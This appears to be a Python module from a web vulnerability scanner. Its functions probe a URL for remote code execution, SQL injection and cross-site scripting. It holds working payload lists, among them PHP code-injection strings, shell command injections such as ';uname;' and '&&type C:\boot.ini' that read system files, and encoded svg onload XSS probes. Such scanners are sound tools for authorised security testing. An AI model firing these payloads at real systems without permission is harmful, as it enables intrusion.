from .main_attack_script import main_function
from .header_script import headers_reader, UserAgent, HTTP_HEADER
import re

# code for Remote Code Execution
def rce_func(url):
    print("[*] Checking for remote code execution")
    headers_reader(url)
    payloads = [';${@print(md5(zigoo0))}', ';${@print(md5("zigoo0"))}']
    payloads += ['%253B%2524%257B%2540print%2528md5%2528%2522zigoo0%2522%2529%2529%257D%253B']
    payloads += [';uname;', '&&dir', '&&type C:\\boot.ini', ';phpinfo();', ';phpinfo']
    check = re.compile("51107ed95250b4099a0f481221d56497|Linux|eval\(\)|SERVER_ADDR|Volume.+Serial|\[boot", re.I)
    return main_function(url, payloads, check)

# code for SQL injection
def error_based_sqli_func(url):
    print("[*] Checking for SQL Injection")
    payloads = ["3'", "3%5c", "3%27%22%28%29", "3'><", "3%22%5C%27%5C%22%29%3B%7C%5D%2A%7B%250d%250a%3C%2500%3E%25bf%2527%27"]
    check = re.compile("Incorrect syntax|Syntax error|Unclosed.+mark|unterminated.+qoute|SQL.+Server|Microsoft.+Database|Fatal.+error", re.I)
    return main_function(url, payloads, check)

#Code for Cross Site Scripting
def xss_func(url):
    print("[*] Checking for Cross site scripting")
    payloads = ['%27%3Ezigoo0%3Csvg%2Fonload%3Dconfirm%28%2Fzigoo0%2F%29%3Eweb', '%78%22%78%3e%78']
    payloads += ['%22%3Ezigoo0%3Csvg%2Fonload%3Dconfirm%28%2Fzigoo0%2F%29%3Eweb', 'zigoo0%3Csvg%2Fonload%3Dconfirm%28%2Fzigoo0%2F%29%3Eweb']
    check = re.compile('zigoo0<svg|x>x', re.I)
    return main_function(url, payloads, check)